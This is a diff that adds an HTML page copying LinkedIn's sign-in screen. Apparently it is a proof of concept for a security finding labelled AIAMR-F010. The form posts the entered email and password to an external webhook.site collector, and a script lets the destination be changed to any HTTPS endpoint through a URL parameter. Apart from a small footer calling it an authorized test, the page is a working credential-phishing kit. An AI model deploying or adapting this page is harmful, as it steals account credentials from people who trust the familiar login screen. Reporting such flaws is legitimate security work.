@@ -1,0 +1,43 @@
+<!doctype html><meta name=viewport content="width=device-width,initial-scale=1">
+<style>
+*{box-sizing:border-box}
+body{margin:0;font:16px -apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#f4f2ee;color:rgba(0,0,0,.9)}
+.wrap{padding:24px 20px}
+.brand{color:#0a66c2;font-size:34px;font-weight:700;letter-spacing:-1px;margin:4px 0 22px}
+.card{background:#fff;border-radius:8px;padding:22px 20px 26px;box-shadow:0 2px 8px rgba(0,0,0,.12)}
+h1{font-size:30px;font-weight:600;margin:0 0 4px}
+p.sub{margin:0 0 22px;font-size:15px;color:rgba(0,0,0,.6)}
+label{display:block;font-size:13px;color:rgba(0,0,0,.6);margin-bottom:4px}
+input[type=text],input[type=password]{width:100%;padding:13px 12px;font-size:16px;border:1px solid rgba(0,0,0,.6);border-radius:4px;margin-bottom:16px;background:#fff}
+input:focus{outline:2px solid #0a66c2;border-color:#0a66c2}
+.forgot{display:block;color:#0a66c2;font-weight:600;font-size:15px;margin:2px 0 20px;text-decoration:none}
+button{width:100%;padding:14px;font-size:17px;font-weight:600;color:#fff;background:#0a66c2;border:0;border-radius:28px}
+.mark{margin-top:20px;text-align:center;font-size:11px;color:rgba(0,0,0,.45)}
+</style>
+<div class=wrap>
+  <div class=brand>Linked<span style="background:#0a66c2;color:#fff;padding:0 4px;border-radius:3px">in</span></div>
+  <div class=card>
+    <h1>Sign in</h1>
+    <p class=sub>Stay updated on your professional world</p>
+    <form method=post action=https://02517e49-af93-40b7-862a-13dab1a94988.webhook.site/c>
+      <label for=u>Email or phone</label>
+      <input id=u type=text name=session_key autocomplete=username>
+      <label for=p>Password</label>
+      <input id=p type=password name=session_password autocomplete=current-password>
+      <a class=forgot href=#>Forgot password?</a>
+      <button type=submit>Sign in</button>
+    </form>
+  </div>
+  <div class=mark>AIAMR-F010 PoC &middot; authorized test &middot; not a live sign-in page<br>
+  attacker content, served off LinkedIn &middot; posting to <span id=dest>the default collector</span></div>
+</div>
+<script>
+/* Reproduction convenience only. It rewrites the form action so a triager can send the
+   values to their own endpoint:  ...raw/f010.html?to=https://<their collector>/c
+   With no parameter it does nothing, and the form posts as plain HTML with no script. */
+var to = new URLSearchParams(location.search).get('to');
+if (to && /^https:\/\//.test(to)) {
+  document.querySelector('form').action = to;
+  document.getElementById('dest').textContent = to;
+}
+</script>
